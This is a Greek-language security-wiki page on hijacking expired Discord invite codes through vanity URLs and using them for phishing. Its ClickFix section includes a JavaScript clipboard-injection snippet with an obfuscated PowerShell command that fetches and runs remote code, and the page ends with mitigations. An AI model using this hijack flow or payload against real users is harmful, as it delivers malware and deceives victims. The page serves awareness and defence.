# Hijacking προσκλήσεων Discord

{{#include ../../banners/hacktricks-training.md}}

Η ευπάθεια στο σύστημα προσκλήσεων του Discord επιτρέπει σε threat actors να διεκδικήσουν ληγμένους ή διαγραμμένους κωδικούς πρόσκλησης (temporary, permanent ή custom vanity) ως νέα vanity links σε οποιονδήποτε server με Level 3 Boost. Με την κανονικοποίηση όλων των κωδικών σε πεζά γράμματα, οι attackers μπορούν να προ-καταχωρίσουν γνωστούς κωδικούς πρόσκλησης και να κάνουν αθόρυβα hijack της κίνησης μόλις λήξει το αρχικό link ή ο source server χάσει το boost του.<sup>[[1]](#references)[[2]](#references)</sup>

## Τύποι προσκλήσεων και κίνδυνος hijack

| Τύπος πρόσκλησης           | Μπορεί να γίνει hijack; | Συνθήκη / Σχόλια                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Μετά τη λήξη, ο κωδικός γίνεται διαθέσιμος και μπορεί να επανεγγραφεί ως vanity URL από έναν boosted server. |
| Permanent Invite Link | ⚠️          | Αν διαγραφεί και αποτελείται μόνο από πεζά γράμματα και ψηφία, ο κωδικός μπορεί να γίνει ξανά διαθέσιμος.        |
| Custom Vanity Link    | ✅          | Αν ο αρχικός server χάσει το Level 3 Boost, η vanity invite του γίνεται διαθέσιμη για νέα εγγραφή.    |

## Βήματα εκμετάλλευσης

1. Αναγνώριση
- Παρακολουθήστε public sources (forums, social media, Telegram channels) για invite links που ταιριάζουν στο pattern `discord.gg/{code}` ή `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Συλλέξτε invite codes που σας ενδιαφέρουν (temporary ή vanity).
2. Pre-registration
- Δημιουργήστε ή χρησιμοποιήστε έναν υπάρχοντα Discord server με δικαιώματα Level 3 Boost.
- Στο **Server Settings → Vanity URL**, προσπαθήστε να αντιστοιχίσετε τον invite code-στόχο. Αν γίνει αποδεκτός, ο κωδικός δεσμεύεται από τον malicious server.
3. Ενεργοποίηση του hijack
- Για temporary invites, περιμένετε μέχρι να λήξει η αρχική πρόσκληση (ή διαγράψτε την χειροκίνητα αν ελέγχετε τον source).
- Για κωδικούς που περιέχουν κεφαλαία, η παραλλαγή με πεζά μπορεί να διεκδικηθεί άμεσα, αν και η ανακατεύθυνση ενεργοποιείται μόνο μετά τη λήξη.
4. Αθόρυβη ανακατεύθυνση
- Οι χρήστες που επισκέπτονται το παλιό link μεταφέρονται απρόσκοπτα στον attacker-controlled server μόλις ενεργοποιηθεί το hijack.

## Phishing Flow μέσω Discord Server

1. Περιορίστε τα channels του server, ώστε να είναι ορατό μόνο ένα **#verify** channel.<sup>[[1]](#references)</sup>
2. Αναπτύξτε ένα bot (π.χ., **Safeguard#0786**) για να ζητά από τους νέους χρήστες να κάνουν verify μέσω OAuth2.
3. Το bot ανακατευθύνει τους χρήστες σε phishing site (π.χ., `captchaguard.me`) με το πρόσχημα ενός CAPTCHA ή ενός βήματος verification.
4. Υλοποιήστε το UX trick **ClickFix**:
- Εμφανίστε ένα μήνυμα για broken CAPTCHA.
- Καθοδηγήστε τους χρήστες να ανοίξουν το παράθυρο **Win+R**, να κάνουν paste μια προφορτωμένη εντολή PowerShell και να πατήσουν Enter.

### Παράδειγμα Clipboard Injection μέσω ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Αυτή η προσέγγιση αποφεύγει τις άμεσες λήψεις αρχείων και αξιοποιεί οικεία στοιχεία UI για να μειώσει τις υποψίες των χρηστών.<sup>[[1]](#references)</sup>

## Mitigations

- Χρησιμοποιήστε μόνιμα invite links που περιέχουν τουλάχιστον ένα κεφαλαίο γράμμα ή έναν μη αλφαριθμητικό χαρακτήρα (δεν λήγουν, δεν μπορούν να επαναχρησιμοποιηθούν).<sup>[[1]](#references)</sup>
- Κάνετε τακτική αλλαγή των invite codes και ανακαλείτε τα παλιά links.
- Παρακολουθείτε την κατάσταση boost του Discord server και τις διεκδικήσεις vanity URL.
- Εκπαιδεύστε τους χρήστες να επαληθεύουν την αυθεντικότητα του server και να αποφεύγουν την εκτέλεση commands που έχουν γίνει paste από το clipboard.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
